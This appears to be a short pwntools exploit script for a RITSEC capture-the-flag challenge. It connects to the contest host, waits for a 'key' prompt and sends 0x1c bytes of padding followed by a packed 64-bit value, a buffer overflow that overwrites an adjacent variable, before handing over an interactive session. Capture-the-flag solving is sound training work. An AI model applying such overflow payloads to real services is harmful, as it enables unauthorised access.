#!/usr/bin/python
from pwn import *

host = 'fun.ritsec.club'
port = 8001

#host = 'localhost'
#port = 4000

r = remote(host, port)
r.recvuntil('key')
r.sendline('a'*0x1c + p64(1))
r.interactive()
